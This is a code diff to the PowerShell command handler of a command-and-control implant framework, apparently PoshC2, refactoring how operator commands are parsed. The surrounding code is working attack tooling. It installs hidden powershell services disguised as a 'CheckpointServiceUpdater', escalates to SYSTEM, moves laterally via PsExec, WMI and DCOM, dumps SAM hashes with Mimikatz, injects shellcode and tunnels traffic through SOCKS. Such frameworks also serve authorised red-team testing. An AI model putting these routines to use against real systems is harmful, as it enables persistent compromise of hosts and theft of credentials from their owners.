@@ -17,6 +17,10 @@ if os.name == 'nt':
 
 
 def handle_ps_command(command, user, randomuri, startup, createdaisypayload, createproxypayload):
+
+    original_command = command
+    command = command.lower().strip()
+
     try:
         check_module_loaded("Stage2-Core.ps1", randomuri, user)
     except Exception as e:
@@ -26,12 +30,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
 
     # alias mapping
     for alias in ps_alias:
-        if command.lower().strip().startswith(alias[0]):
+        if command.startswith(alias[0]):
             command.replace(alias[0], alias[1])
 
     # opsec failures
     for opsec in ps_opsec:
-        if opsec == command.lower()[:len(opsec)]:
+        if opsec == command[:len(opsec)]:
             print(Colours.RED)
             print("**OPSEC Warning**")
             impid = get_implantdetails(randomuri)
@@ -40,11 +44,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
                 command = ""
             if ri == "":
                 command = ""
-            if ri.lower() == "y":
-                command = command
             break
 
-    if ('beacon' in command.lower() and '-beacon' not in command.lower()) or 'set-beacon' in command.lower() or 'setbeacon' in command.lower():
+    if command.startswith("beacon") or command.startswith("set-beacon") or command.startswith("setbeacon"):
         new_sleep = command.replace('set-beacon ', '')
         new_sleep = new_sleep.replace('setbeacon ', '')
         new_sleep = new_sleep.replace('beacon ', '').strip()
@@ -56,22 +58,22 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             new_task(command, user, randomuri)
             update_sleep(new_sleep, randomuri)
 
-    elif (command.lower().startswith('label-implant')):
+    elif (command.startswith('label-implant')):
         label = command.replace('label-implant ', '')
         update_label(label, randomuri)
         startup(user)
 
-    elif "searchhelp" in command.lower():
-        searchterm = (command.lower()).replace("searchhelp ", "")
+    elif command.startswith("searchhelp"):
+        searchterm = (command).replace("searchhelp ", "")
         helpful = posh_help.split('\n')
         for line in helpful:
             if searchterm in line.lower():
                 print(line)
 
-    elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
+    elif (command == "back") or (command == "clear"):
         startup(user)
 
-    elif "install-servicelevel-persistencewithproxy" in command.lower():
+    elif command.startswith("install-servicelevel-persistencewithproxy"):
         C2 = get_c2server_all()
         if C2[11] == "":
             startup(user, "Need to run createproxypayload first")
@@ -83,7 +85,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
             new_task(cmd, user, randomuri)
 
-    elif "install-servicelevel-persistence" in command.lower():
+    elif command.startswith("install-servicelevel-persistence"):
         C2 = get_c2server_all()
         newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                               "", "", "", "", C2[19], C2[20],
@@ -92,14 +94,14 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
         new_task(cmd, user, randomuri)
 
-    elif "remove-servicelevel-persistence" in command.lower():
+    elif command.startswith("remove-servicelevel-persistence"):
         new_task("sc.exe delete CPUpdater", user, randomuri)
 
     # psexec lateral movement
-    elif "get-implantworkingdirectory" in command.lower():
+    elif command.startswith("get-implantworkingdirectory"):
         new_task("pwd", user, randomuri)
 
-    elif "get-system-withproxy" in command.lower():
+    elif command.startswith("get-system-withproxy"):
         C2 = get_c2server_all()
         if C2[11] == "":
             startup(user, "Need to run createproxypayload first")
@@ -115,7 +117,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             cmd = "sc.exe delete CPUpdaterMisc"
             new_task(cmd, user, randomuri)
 
-    elif "get-system-withdaisy" in command.lower():
+    elif command.startswith("get-system-withdaisy"):
         C2 = get_c2server_all()
         daisyname = input("Payload name required: ")
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
@@ -128,7 +130,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             cmd = "sc.exe delete CPUpdaterMisc"
             new_task(cmd, user, randomuri)
 
-    elif "get-system" in command.lower():
+    elif command.startswith("get-system"):
         C2 = get_c2server_all()
         newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                               "", "", "", "", C2[19], C2[20],
@@ -141,7 +143,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         cmd = "sc.exe delete CPUpdaterMisc"
         new_task(cmd, user, randomuri)
 
-    elif "quit" in command.lower():
+    elif command == "quit":
         ri = input("Are you sure you want to quit? (Y/n) ")
         if ri.lower() == "n":
             startup(user)
@@ -150,7 +152,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         if ri.lower() == "y":
             sys.exit(0)
 
-    elif "invoke-psexecproxypayload" in command.lower():
+    elif command.startswith("invoke-psexecproxypayload"):
         check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
             with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
@@ -162,7 +164,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         else:
             startup(user, "Need to run createproxypayload first")
 
-    elif "invoke-psexecdaisypayload" in command.lower():
+    elif command.startswith("invoke-psexecdaisypayload"):
         check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
         daisyname = input("Payload name required: ")
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
@@ -175,7 +177,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         else:
             startup(user, "Need to run createdaisypayload first")
 
-    elif "invoke-psexecpayload" in command.lower():
+    elif command.startswith("invoke-psexecpayload"):
         check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
         C2 = get_c2server_all()
         newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
@@ -188,7 +190,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         new_task(cmd, user, randomuri)
 
     # wmi lateral movement
-    elif "invoke-wmiproxypayload" in command.lower():
+    elif command.startswith("invoke-wmiproxypayload"):
         check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
             with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
@@ -200,7 +202,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         else:
             startup(user, "Need to run createproxypayload first")
 
-    elif "invoke-wmidaisypayload" in command.lower():
+    elif command.startswith("invoke-wmidaisypayload"):
         check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
         daisyname = input("Name required: ")
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
@@ -213,7 +215,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         else:
             startup(user, "Need to run createdaisypayload first")
 
-    elif "invoke-wmipayload" in command.lower():
+    elif command.startswith("invoke-wmipayload"):
         check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
         C2 = get_c2server_all()
         newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
@@ -226,7 +228,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         new_task(cmd, user, randomuri)
 
     # dcom lateral movement
-    elif "invoke-dcomproxypayload" in command.lower():
+    elif command.startswith("invoke-dcomproxypayload"):
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
             with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
                 payload = p.read()
@@ -239,7 +241,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         else:
             startup(user, "Need to run createproxypayload first")
 
-    elif "invoke-dcomdaisypayload" in command.lower():
+    elif command.startswith("invoke-dcomdaisypayload"):
         daisyname = input("Name required: ")
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
             with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
@@ -251,7 +253,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         else:
             startup(user, "Need to run createdaisypayload first")
 
-    elif "invoke-dcompayload" in command.lower():
+    elif command.startswith("invoke-dcompayload"):
         C2 = get_c2server_all()
         newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                               "", "", "", "", C2[19], C2[20],
@@ -263,7 +265,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         new_task(pscommand, user, randomuri)
 
     # runas payloads
-    elif "invoke-runasdaisypayload" in command.lower():
+    elif command.startswith("invoke-runasdaisypayload"):
         daisyname = input("Name required: ")
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
             with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
@@ -279,7 +281,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         else:
             startup(user, "Need to run createdaisypayload first")
 
-    elif "invoke-runasproxypayload" in command.lower():
+    elif command.startswith("invoke-runasproxypayload"):
         C2 = get_c2server_all()
         if C2[11] == "":
             startup(user, "Need to run createproxypayload first")
@@ -298,7 +300,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
             new_task(pscommand, user, randomuri)
 
-    elif "invoke-runaspayload" in command.lower():
+    elif command.startswith("invoke-runaspayload"):
         check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
         check_module_loaded("NamedPipe.ps1", randomuri, user)
         params = re.compile("invoke-runaspayload ", re.IGNORECASE)
@@ -307,35 +309,35 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
         new_task(pscommand, user, randomuri)
 
-    elif command.lower() == "help" or command == "?" or command.lower() == "help ":
+    elif command == "help" or command == "?":
         print(posh_help)
-    elif command.lower() == "help 1":
+    elif command == "help 1":
         print(posh_help1)
-    elif command.lower() == "help 2":
+    elif command == "help 2":
         print(posh_help2)
-    elif command.lower() == "help 3":
+    elif command == "help 3":
         print(posh_help3)
-    elif command.lower() == "help 4":
+    elif command == "help 4":
         print(posh_help4)
-    elif command.lower() == "help 5":
+    elif command == "help 5":
         print(posh_help5)
-    elif command.lower() == "help 6":
+    elif command == "help 6":
         print(posh_help6)
-    elif command.lower() == "help 7":
+    elif command == "help 7":
         print(posh_help7)
-    elif command.lower() == "help 8":
+    elif command == "help 8":
         print(posh_help8)
 
-    elif "get-pid" in command.lower():
+    elif command.startswith("get-pid"):
         pid = get_implantdetails(randomuri)
         print(pid[8])
 
-    elif "upload-file" in command.lower():
+    elif command.startswith("upload-file"):
         source = ""
         destination = ""
         s = ""
         nothidden = False
-        if command.strip().lower() == "upload-file":
+        if command == "upload-file":
             source = readfile_with_completion("Location of file to upload: ")
             while not os.path.isfile(source):
                 print("File does not exist: %s" % source)
@@ -365,7 +367,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             print("Error with source file: %s" % e)
             traceback.print_exc()
 
-    elif "kill-implant" in command.lower() or "exit" in command.lower():
+    elif command == "kill-implant" or command == "exit":
         impid = get_implantdetails(randomuri)
         ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
         if ri.lower() == "n":
@@ -377,35 +379,35 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             new_task("exit", user, randomuri)
             kill_implant(randomuri)
 
-    elif "unhide-implant" in command.lower():
+    elif command.startswith("unhide-implant"):
         unhide_implant(randomuri)
 
-    elif "hide-implant" in command.lower():
+    elif command.startswith("hide-implant"):
         kill_implant(randomuri)
 
-    elif "migrate" in command[:7].lower():
+    elif command.startswith("migrate"):
         params = re.compile("migrate", re.IGNORECASE)
         params = params.sub("", command)
         migrate(randomuri, user, params)
 
-    elif "loadmoduleforce" in command.lower():
+    elif command.startswith("loadmoduleforce"):
         params = re.compile("loadmoduleforce ", re.IGNORECASE)
         params = params.sub("", command)
         check_module_loaded(params, randomuri, user, force=True)
 
-    elif "loadmodule" in command.lower():
+    elif command.startswith("loadmodule"):
         params = re.compile("loadmodule ", re.IGNORECASE)
         params = params.sub("", command)
         check_module_loaded(params, randomuri, user)
 
-    elif "invoke-daisychain" in command.lower():
+    elif command.startswith("invoke-daisychain"):
         urls = get_allurls()
         new_task("%s -URLs '%s'" % (command, urls), user, randomuri)
         update_label("DaisyServer", randomuri)
         startup(user)
         print("Now use createdaisypayload")
 
-    elif "inject-shellcode" in command.lower():
+    elif command.startswith("inject-shellcode"):
         params = re.compile("inject-shellcode", re.IGNORECASE)
         params = params.sub("", command)
         check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
@@ -423,21 +425,21 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         except Exception as e:
             print("Error loading file: %s" % e)
 
-    elif "listmodules" in command.lower():
+    elif command == "listmodules":
         print(os.listdir("%s/Modules/" % POSHDIR))
 
-    elif "modulesloaded" in command.lower():
+    elif command == "modulesloaded":
         ml = get_implantdetails(randomuri)
         print(ml[14])
 
-    elif (command.lower() == "ps") or (command.lower() == "ps "):
+    elif command == "ps":
         new_task("get-processlist", user, randomuri)
 
-    elif (command.lower() == "hashdump") or (command.lower() == "hashdump "):
+    elif command == "hashdump":
         check_module_loaded("Invoke-Mimikatz.ps1", randomuri, user)
         new_task("Invoke-Mimikatz -Command '\"lsadump::sam\"'", user, randomuri)
 
-    elif (command.lower() == "sharpsocks") or (command.lower() == "sharpsocks "):
+    elif command == "sharpsocks":
         check_module_loaded("SharpSocks.ps1", randomuri, user)
         import string
         from random import choice
@@ -463,26 +465,26 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl, channel, sharpkey, sharpurls), user, randomuri)
         update_label("SharpSocks", randomuri)
 
-    elif (command.lower() == "history") or command.lower() == "history ":
+    elif command == "history":
         startup(user, get_history())
 
-    elif "reversedns" in command.lower():
+    elif command.startswith("reversedns"):
         params = re.compile("reversedns ", re.IGNORECASE)
         params = params.sub("", command)
         new_task("[System.Net.Dns]::GetHostEntry(\"%s\")" % params, user, randomuri)
 
-    elif "createdaisypayload" in command.lower():
+    elif command.startswith("createdaisypayload"):
         createdaisypayload(user, startup)
 
-    elif "createproxypayload" in command.lower():
+    elif command.startswith("createproxypayload"):
         createproxypayload(user, startup)
 
-    elif "createnewpayload" in command.lower():
+    elif command.startswith("createnewpayload"):
         createproxypayload(user, startup)
 
     else:
         if command:
-            new_task(command, user, randomuri)
+            new_task(original_command, user, randomuri)
         return
 
 
